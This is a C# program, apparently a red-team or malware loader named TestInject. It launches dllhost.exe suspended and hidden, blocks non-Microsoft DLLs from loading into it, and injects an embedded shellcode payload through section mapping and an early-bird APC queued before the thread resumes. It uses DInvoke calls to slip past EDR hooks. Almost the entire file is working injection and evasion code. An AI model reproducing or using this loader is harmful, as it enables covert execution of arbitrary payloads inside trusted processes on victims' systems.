using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TestInject
{
    internal class Program
    {

        static void Main(string[] args)
        {
            //string cmd = "cmd /c echo tata && ping 127.0.0.1";
            string cmd = @"c:\windows\system32\dllhost.exe";
            byte[] shellcode = Properties.Resources.Payload;

            //===================================================================================================================

            //var sInfoEx = new STARTUPINFOEX();
            //sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);

            //IntPtr lpValue = IntPtr.Zero;


            //SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
            //saAttr.nLength = Marshal.SizeOf(saAttr);
            //saAttr.bInheritHandle = 1;
            //saAttr.lpSecurityDescriptor = IntPtr.Zero;

            ////Create output pipe
            //CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr, 0);

            //// Ensure the read handle to the pipe for STDOUT is not inherited.
            //SetHandleInformation(outPipe_rd, HANDLE_FLAGS.INHERIT, 0);

            //sInfoEx.StartupInfo.hStdError = outPipe_w;
            //sInfoEx.StartupInfo.hStdOutput = outPipe_w;
            ////sInfoEx.StartupInfo.hStdInput = inPipe_rd;

            //sInfoEx.StartupInfo.dwFlags |= (uint)CreationFlags.UseStdHandles;

            //var pSec = new SECURITY_ATTRIBUTES();
            //var tSec = new SECURITY_ATTRIBUTES();
            //pSec.nLength = Marshal.SizeOf(pSec);
            //tSec.nLength = Marshal.SizeOf(tSec);

            //CreateProcess(null, cmd, ref pSec, ref tSec, true, (uint)(CreationFlags.ExtendedStartupInfoPresent), IntPtr.Zero, null, ref sInfoEx, out var pInfo);



            //***************************************************************************************************************************************************************************


            var startupInfoEx = new DInvoke.Kernel32.STARTUPINFOEX();

            _ = DInvoke.Kernel32.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);

            const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
            const int MITIGATION_POLICY = 0x20007;

            var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

            _ = DInvoke.Kernel32.UpdateProcThreadAttribute(
                ref startupInfoEx.lpAttributeList,
                (IntPtr)MITIGATION_POLICY,
                ref blockDllPtr);

            const uint USE_STD_HANDLES = 0x00000100;

            DInvoke.Kernel32.SECURITY_ATTRIBUTES saAttr = new DInvoke.Kernel32.SECURITY_ATTRIBUTES();
            saAttr.bInheritHandle = true;
            saAttr.lpSecurityDescriptor = IntPtr.Zero;
            //

            //SECURITY_ATTRIBUTES saAttr2 = new SECURITY_ATTRIBUTES();
            //saAttr2.nLength = Marshal.SizeOf(saAttr2);
            //saAttr2.bInheritHandle = true;
            //saAttr2.lpSecurityDescriptor = IntPtr.Zero;
            //CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr, 0);
            DInvoke.Kernel32.CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr);

            // Ensure the read handle to the pipe for STDOUT is not inherited.
            DInvoke.Kernel32.SetHandleInformation(outPipe_rd, DInvoke.Kernel32.HANDLE_FLAGS.INHERIT, 0);
            

            startupInfoEx.StartupInfo.hStdError = outPipe_w;
            startupInfoEx.StartupInfo.hStdOutput = outPipe_w;
            //sInfoEx.StartupInfo.hStdInput = inPipe_rd;


            startupInfoEx.StartupInfo.dwFlags |= USE_STD_HANDLES;


            const uint CREATE_SUSPENDED = 0x00000004;
            const uint CREATE_NO_WINDOW = 0x08000000;
            const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;

            DInvoke.Kernel32.CreateProcessW(
                cmd,
                null,
                //CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUP_INFO_PRESENT,
                EXTENDED_STARTUP_INFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                ref startupInfoEx,
                out var pInfo, true);


            //=================================================================================================================================================================

            DInvoke.Kernel32.CloseHandle(outPipe_w);

            var procId = pInfo.dwProcessId;
            if (procId == 0)
            {
                throw new InvalidOperationException("Process was not started!");
            }

            const uint GENERIC_ALL = 0x10000000;
            const uint PAGE_EXECUTE_READWRITE = 0x40;
            const uint SEC_COMMIT = 0x08000000;

            var hLocalSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            var status = DInvoke.Native.NtCreateSection(
                ref hLocalSection,
                GENERIC_ALL,
                IntPtr.Zero,
                ref maxSize,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,
                IntPtr.Zero);

            const uint PAGE_READWRITE = 0x04;

            var self = System.Diagnostics.Process.GetCurrentProcess();
            var hLocalBaseAddress = IntPtr.Zero;

            status = DInvoke.Native.NtMapViewOfSection(
                hLocalSection,
                self.Handle,
                ref hLocalBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_READWRITE);

            const uint PAGE_EXECUTE_READ = 0x20;

            var hRemoteBaseAddress = IntPtr.Zero;

            status = DInvoke.Native.NtMapViewOfSection(
                hLocalSection,
                pInfo.hProcess,
                ref hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_EXECUTE_READ);

            Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

            var res = DInvoke.Native.NtQueueApcThread(
            pInfo.hThread,
            hRemoteBaseAddress,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero);

            _ = DInvoke.Native.NtResumeThread(pInfo.hThread);
            //==========================================================================================================




            Process process = Process.GetProcessById(pInfo.dwProcessId);

            byte[] b = null;
            while (!process.HasExited)
            {
                b = ReadFromPipe(outPipe_rd);
                if (b != null)
                {
                    Console.WriteLine("Received : " + Encoding.UTF8.GetString(b));
                }
                Thread.Sleep(100);
            }
            b = ReadFromPipe(outPipe_rd);
            if (b != null)
            {
                Console.WriteLine(Encoding.UTF8.GetString(b));
            }

            DInvoke.Kernel32.CloseHandle(outPipe_rd);

            Console.WriteLine("key plz");
            Console.ReadKey();
            return;
        }

        //static byte[] ReadFromPipe(IntPtr pipe)
        //// Read output from the child process's pipe for STDOUT
        //// and write to the parent process's pipe for STDOUT. 
        //// Stop when there is no more data. 
        //{
        //    byte[] chBuf = new byte[1024];
        //    bool bSuccess = false;

        //    //while (!bSuccess)
        //    //{
        //    bSuccess = ReadFile(pipe, chBuf, 1024, out var nbBytesRead, IntPtr.Zero);
        //    if (!bSuccess)
        //    {
        //        Console.WriteLine($"Failed reading pipe, error code: {Marshal.GetLastWin32Error()}");
        //        return null;
        //    }

        //    return chBuf;
        //    //    if (!bSuccess || nbBytesRead == 0) break;

        //    //    if (!bSuccess) break;
        //    //}
        //}

        static byte[] ReadFromPipe(IntPtr pipe)
        {
           
            if (!DInvoke.Kernel32.ReadFile(pipe,  out var buff, 1024))
            {
                Console.WriteLine($"Failed reading pipe, error code: {Marshal.GetLastWin32Error()}");
                return null;
            }

            return buff;
        }
    }
}
